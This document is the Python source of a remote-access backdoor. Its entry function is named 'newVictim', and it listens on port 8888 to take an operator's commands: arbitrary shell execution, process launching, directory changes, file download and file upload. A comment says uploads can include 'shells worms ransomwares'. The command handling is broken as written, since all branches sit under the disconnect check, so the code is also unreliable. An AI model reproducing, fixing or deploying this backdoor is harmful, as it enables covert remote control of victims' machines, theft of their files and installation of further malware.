import socket
import os
import subprocess

END_OF_STRING = "[XX]END OF STRING[XX]"
END_OF_FILE = "[XX]END OF DATA[XX]"


def newVictim():
    global session
    port = 8888

    session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    session.bind(("", port))
    session.listen(1)
    listeningServer()


def sessionManagement():
    global connection
    connection, address = session.accept()


def Result(args):
    connection.send(args + END_OF_STRING)


def listeningServer():
    while True:
        try:
            command = connection.recv(1024)

            if command == "Disconnect":

                connection.close()

                if command.startswith(":"):

                    if command[1:3] == "cd":
                        try:
                            os.chdir(command[4:])
                            args = "moved to another directory\n"
                            Result(args)
                        except:
 
                            args = "directory not found\n"
                            Result(args)

                    elif command[1:11] == "newProcess":
                        if command[12:] == "":
                            args = "Provide program name"
                        else:

                            subprocess.Popen(
                                command[12:],
                                shell=True)
                            args = "Running program in a new process\n"
                        Result(args)

                    elif command[1:9] == "download": #Transfer data from server to client

                        fileName = command[10:]

                        try:
                            f = open(fileName, 'r')
                            l = f.read(1024)

                            while (l):
                                connection.send(l)
                                l = f.read(1024)
                            f.close()
                            connection.send(END_OF_FILE)

                        except IOError:
                            args = "File not found\n" + END_OF_STRING
                            Result(args)

                    elif command[1:7] == "upload":  #Upload file from client to server
                        fileName = command[8:]      #Shells worms ransomwares :anything:
                        f = open(fileName, 'w')
                        while True:
                            l = connection.recv(1024)

                            while (l):
                                if l.endswith(END_OF_FILE):
                                    if END_OF_FILE in l:
                                        l = l.replace(END_OF_FILE, "")
                                    f.write(l)
                                    args = "Upload complete\n"
                                    Result(args)
                                    break
                                else:
                                    f.write(l)
                                    l = connection.recv(1024)
                            break

                        f.close()

                    else:
                        process = subprocess.Popen(
                            command[1:], shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
                        args = process.stdout.read() + process.stderr.read()
                        Result(args)

                        if len(args) == 0:
                            args = "command executed\n"
                            Result(args) #If there is no command

                else:
                    args = "Invalid command\n" #Error if command will not start with ::
                    Result(args)
        except:
            sessionManagement()

if __name__ == "__main__":
    newVictim()